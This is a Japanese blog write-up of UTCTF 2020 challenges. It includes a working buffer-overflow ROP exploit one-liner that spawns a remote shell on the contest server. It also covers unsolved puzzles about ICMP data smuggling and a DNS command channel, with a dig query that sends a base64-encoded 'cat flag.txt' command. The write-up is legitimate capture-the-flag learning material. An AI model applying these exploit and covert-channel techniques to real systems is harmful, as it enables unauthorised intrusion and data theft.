---
title: "UTCTF Writeup | フラxxグゲット"
date: 2020-03-09T22:00:00+09:00
lastmod: 2020-03-09T22:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF", "Reviewed"]
categories: ["CTF"]
author: ""
---
URL: [https://utctf.live/challenges](https://utctf.live/challenges)
<br /><br />
えと、簡単なのしか解いてないので、テキトーです。

<br /><br />

<img src="https://captureamerica.github.io/writeups/img/utctf_2020_Score1.png" alt="utctf_2020_Score1.png">


<br /><br />
## [Pwn]: bof
- - -
### Challenge
> nc binary.utctf.live 9002

Attachment:

- pwnable (ELF 64bit)


<br />
### Solution
Ghidraでソースを確認します。

```C
undefined8 main(void)
{
  char local_78 [112];
  
  puts("I really like strings! Please give me a good one!");
  gets(local_78);
  puts("Thanks for the string");
  return 1;
}

void get_flag(int param_1)
{
  char *local_18;
  undefined8 local_10;
  
  if (param_1 == -0x21524111) {
    local_18 = "/bin/sh";
    local_10 = 0;
    execve("/bin/sh",&local_18,(char **)0x0);
  }
  return;
}
```

<br>
<pre>
captureamerica@kali:~/CTF/UTCTF_2020$ checksec ./pwnable 
[*] '/home/captureamerica/CTF/UTCTF_2020/pwnable'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>

タイトル通りBuffer Overflowのチャレンジで、get_flagを正しい引数で呼べたら/bin/shが呼ばれる、というやつです。

あと、これは64bitです。

<br>
pop rdi ; retを使います。
<pre>
captureamerica@kali:~/CTF/UTCTF_2020$ ROPgadget --binary pwnable | grep ret | grep ": pop"
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400692 : pop r15 ; ret
0x0000000000400582 : pop rbp ; mov byte ptr [rip + 0x200abe], 1 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400520 : pop rbp ; ret
0x000000000040028e : pop rbp ; retf 0x2d9e
0x0000000000400693 : pop rdi ; ret   <--- これ
0x0000000000400691 : pop rsi ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</pre>

<br>
get_flag()関数のアドレス
<pre>
gef➤  x get_flag
0x4005ea <get_flag>:	0xe5894855
</pre>

<br>
引数はよくある0xdeadbeefです。（0xffffffffを足しているんで、更に+1します）
<pre>
captureamerica@kali:~/CTF/UTCTF_2020$ python3
>>> hex(-0x21524111+0xffffffff)
'0xdeadbeee'
</pre>


<br>
以下でフラグゲット。
<pre>
captureamerica@kali:~/CTF/UTCTF_2020$ (python -c "print('a'*112+'a'*8+'\x93\x06\x40\x00\x00\x00\x00\x00'+'\xef\xbe\xad\xde\x00\x00\x00\x00'+'\xea\x05\x40\x00\x00\x00\x00\x00')" ; cat - ) | nc binary.utctf.live 9002
I really like strings! Please give me a good one!
Thanks for the string
id
uid=1000(stackoverflow) gid=1000(stackoverflow) groups=1000(stackoverflow)
ls
flag.txt
cat flag.txt
utflag{thanks_for_the_string_!!!!!!}
</pre>


<br />
Flag: `utflag{thanks_for_the_string_!!!!!!}`


<br /><br />
<br /><br />
さて、ここから下は、解きたかったけど解けなくて諦めたやつです。

## [Network]: Nittaku 3 Star Premium
- - -
### Challenge
> I found some weird data while monitoring my network, but I didn't catch it all. See if you can make sense of it.

Attachment:

- capture.pcap

<br />
### (Unsolved)
ICMP（ping）に大きなデータがついてます。だからチャレンジ名がNittaku 3 starなんですね。なかなかネーミングセンスがいいです。

4つに分かれているので、ひとつにまとめて、base64デコードするとgzファイルになって中にflag.pngが入ってます。

ただし、壊れたgzファイルになっちゃうので、フラグが部分的にしか取れませんでした。。。


<br /><br />
<br /><br />
(2020/03/09 - Writeup見ました。)

フラグの続きは実際にPingをして取ってこないといけなかったようですね。ふーん。




<br /><br />
<br /><br />
## [Network]: Do Not Stop
- - -
### Challenge
> One of my servers was compromised, but I can't figure it out. See if you can solve it for me!

Attachment:

- capture.pcap

<br />
### (Unsolved)
DNSがbas64エンコードされています。肝心なフラグの中身はpcapの中には含まれていないようです。

DNSサーバが35.188.185.68なので、そこに対して`cat flag.txt`をbase64エンコードしたものをクエリーするとフラグが取れると思ったんですが、DNSサーバに繋がらなくてダメでした。。。

Discordでも、サーバに繋がらないよ〜って言っている人が何人かいたんですけど、Adminの人はサーバ動いているよ、って言っているし。


<pre>
captureamerica@kali:~$ dig -t TXT Y2F0IGZsYWcudHh0Cg== @35.188.185.68

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> -t TXT Y2F0IGZsYWcudHh0Cg== @35.188.185.68
;; global options: +cmd
;; connection timed out; no servers could be reached
</pre>


<br /><br />
<br /><br />
(2020/03/09 - Writeup見ました。)

なんか、クエリーを投げるDNSサーバは35.188.185.68じゃなかったみたいです。。。




<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

